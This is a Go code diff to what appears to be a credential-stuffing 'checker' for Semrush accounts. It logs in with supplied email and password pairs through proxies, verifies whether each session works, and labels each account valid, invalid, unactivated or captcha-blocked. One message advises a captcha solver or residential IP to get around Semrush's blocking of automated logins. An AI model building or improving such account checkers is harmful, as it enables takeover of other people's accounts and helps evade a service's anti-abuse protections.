@@ -103,6 +103,12 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 		return result
 	}
 
+	if semrushOptionsRequireRecaptcha(optsResp) {
+		result.Status = StatusRecaptchaRequired
+		result.Reason = "reCAPTCHA required for login (Semrush flagged this IP — use captcha solver or residential IP)"
+		return result
+	}
+
 	// Step 4: POST /sso/authorize
 	authPayload := map[string]string{
 		"locale":                "en",
@@ -155,9 +161,16 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 
 	c.followSemrushPostAuth(client, authBody, authHeaders)
 
-	verified, accountEmail, verifyReason := c.verifySemrushAuthenticated(client)
+	verified, accountEmail, verifyKind, verifyReason := c.verifySemrushSession(client, optsResp, authBody, authStatus)
 	if !verified {
-		result.Status = StatusFail
+		switch verifyKind {
+		case "captcha":
+			result.Status = StatusRecaptchaRequired
+		case "error":
+			result.Status = StatusError
+		default:
+			result.Status = StatusFail
+		}
 		if verifyReason == "" {
 			verifyReason = "invalid email or password"
 		}
@@ -235,9 +248,20 @@ func (c *Checker) followSemrushPostAuth(client *http.Client, authBody string, au
 		seen[u] = struct{}{}
 		_, _, _, _ = c.doRequest(client, "GET", u, headers, "")
 	}
+	// Browser always loads /home/ after authorize to finalize SSO cookies (sso_token).
+	homeURL := c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/")
+	_, _, _, _ = c.doRequest(client, "GET", homeURL, map[string]string{
+		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Referer":    c.cfg.LoginURL(),
+		"User-Agent": c.cfg.UserAgent,
+	}, "")
 }
 
-func (c *Checker) verifySemrushAuthenticated(client *http.Client) (bool, string, string) {
+func (c *Checker) verifySemrushSession(client *http.Client, optsResp, authBody string, authStatus int) (ok bool, accountEmail, kind, reason string) {
+	if semrushAuthBodyIsWrongCredentials(authBody) {
+		return false, "", "invalid", "invalid email or password"
+	}
+
 	userInfoURL := c.cfg.Var("user_info_url", c.cfg.BaseURL()+"/accounts/user-info")
 	headers := map[string]string{
 		"Accept":     "application/json, text/plain, */*",
@@ -246,23 +270,99 @@ func (c *Checker) verifySemrushAuthenticated(client *http.Client) (bool, string,
 	}
 	body, status, _, err := c.doRequest(client, "GET", userInfoURL, headers, "")
 	if err != nil {
-		return false, "", err.Error()
+		return false, "", "error", err.Error()
 	}
-	if status == http.StatusUnauthorized || status == http.StatusForbidden {
-		return false, "", "invalid email or password"
+	if status == http.StatusOK && semrushUserInfoJSON(body) {
+		email, _ := jsonPathString(body, "email")
+		id, _ := jsonPathString(body, "id")
+		if email != "" || id != "" {
+			if activated, okAct := jsonPathString(body, "activated"); okAct && activated == "false" {
+				return false, "", "invalid", "account not activated"
+			}
+			return true, email, "", ""
+		}
 	}
-	if status != http.StatusOK {
-		return false, "", fmt.Sprintf("not authenticated (user-info HTTP %d)", status)
+
+	// Fallback: subscription header JSON proves authenticated session.
+	subReferer := c.cfg.Var("subscription_page_url", c.cfg.BaseURL()+"/accounts/subscription-info/")
+	subBody, subStatus, _, _ := c.doRequest(client, "GET", c.cfg.AccountQueryURL(), map[string]string{
+		"Accept":     "application/json, text/plain, */*",
+		"Referer":    subReferer,
+		"User-Agent": c.cfg.UserAgent,
+	}, "")
+	if subStatus == http.StatusOK {
+		if _, okPlan := parseSemrushSubscriptionHeader(subBody); okPlan {
+			if semrushUserInfoJSON(body) {
+				email, _ := jsonPathString(body, "email")
+				if email != "" {
+					return true, email, "", ""
+				}
+			}
+			return true, "", "", ""
+		}
 	}
-	email, _ := jsonPathString(body, "email")
-	id, _ := jsonPathString(body, "id")
-	if email == "" && id == "" {
-		return false, "", "invalid email or password"
+	if subStatus == http.StatusUnauthorized || strings.Contains(strings.ToLower(subBody), "unauthorized") {
+		return false, "", "captcha", "reCAPTCHA required — subscription API unauthorized"
 	}
-	if activated, ok := jsonPathString(body, "activated"); ok && activated == "false" {
-		return false, "", "account not activated"
+
+	if semrushResponseNeedsRecaptcha(authBody) || semrushOptionsRequireRecaptcha(optsResp) {
+		return false, "", "captcha", "reCAPTCHA required — Semrush blocked automated login from this IP"
 	}
-	return true, email, ""
+	if semrushIsHTMLBlockPage(body) || status == http.StatusForbidden {
+		return false, "", "captcha", "reCAPTCHA required — session not established (user-info blocked)"
+	}
+	if status == http.StatusUnauthorized {
+		return false, "", "captcha", "reCAPTCHA required — not authenticated after login attempt"
+	}
+	if authStatus >= 200 && authStatus < 300 && strings.TrimSpace(authBody) == "" {
+		return false, "", "captcha", "reCAPTCHA required — empty authorize response (no SSO session)"
+	}
+	return false, "", "captcha", "reCAPTCHA required — could not verify login session"
+}
+
+func semrushUserInfoJSON(body string) bool {
+	trimmed := strings.TrimSpace(body)
+	return strings.HasPrefix(trimmed, "{") && strings.Contains(trimmed, `"email"`)
+}
+
+func semrushIsHTMLBlockPage(body string) bool {
+	lower := strings.ToLower(body)
+	return strings.HasPrefix(strings.TrimSpace(body), "<!") ||
+		strings.Contains(lower, "secret page") ||
+		strings.Contains(lower, "<html")
+}
+
+func semrushAuthBodyIsWrongCredentials(body string) bool {
+	mc := semrushMessageCode(body)
+	switch mc {
+	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
+		return true
+	}
+	lower := strings.ToLower(body)
+	for _, phrase := range []string{
+		"wrong login or password",
+		"invalid email or password",
+		"incorrect email or password",
+	} {
+		if strings.Contains(lower, phrase) {
+			return true
+		}
+	}
+	return false
+}
+
+func semrushOptionsRequireRecaptcha(body string) bool {
+	if semrushResponseNeedsRecaptcha(body) {
+		return true
+	}
+	return strings.Contains(strings.ToLower(body), `"recaptcha_authorize":true`)
+}
+
+func semrushMessageCode(body string) string {
+	if mc, ok := jsonPathString(body, "message_code"); ok {
+		return strings.ToUpper(strings.TrimSpace(mc))
+	}
+	return ""
 }
 
 func semrushAuthBodyIndicatesFailure(body string) bool {
@@ -404,6 +504,9 @@ func (c *Checker) fetchURL(client *http.Client, rawURL string, headers map[strin
 }
 
 func semrushErrorCode(body string) string {
+	if mc := semrushMessageCode(body); mc != "" {
+		return mc
+	}
 	if code, ok := jsonPathString(body, "code"); ok {
 		return strings.ToUpper(strings.TrimSpace(code))
 	}
@@ -442,7 +545,7 @@ func parseSemrushAuthFailure(body string, status int) string {
 	lower := strings.ToLower(body)
 
 	switch code {
-	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA":
+	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA", "ERROR_RECAPTCHA_NEED":
 		return "recaptcha_required"
 	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
 		return "invalid email or password"
